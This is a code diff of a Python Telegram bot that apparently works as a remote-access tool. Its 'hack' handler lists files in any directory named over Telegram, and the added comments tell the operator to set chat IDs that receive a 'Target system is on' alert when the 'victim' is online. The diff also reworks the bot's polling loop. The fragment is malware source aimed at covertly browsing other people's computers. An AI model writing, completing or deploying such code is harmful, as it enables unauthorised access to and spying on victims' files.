@@ -12,7 +12,6 @@ def start(message):
 
 def hack(message):
     dir=message.text
-    # maindir="D:/"
     bot.reply_to(message,f"Getting access to {message.text}.Please wait.....")
     try:
         list=os.listdir(dir)
@@ -89,7 +88,12 @@ def check(message):
 
 print("Bot Started.....")
 
-# bot.polling()
+#Add below the chatid's to which you wanna forward alart when victic is online.
+
+# bot.send_message("","Target system is on......")
+# bot.send_message("","Target system is on......")
+# bot.send_message("","Target system is on......")
+# bot.send_message("","Target system is on......")
 while True:
     try:
         bot.polling(none_stop=True)
@@ -98,3 +102,4 @@ while True:
         # Implement your retry logic here or just pass to retry on the next loop iteration
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
+# bot.polling()
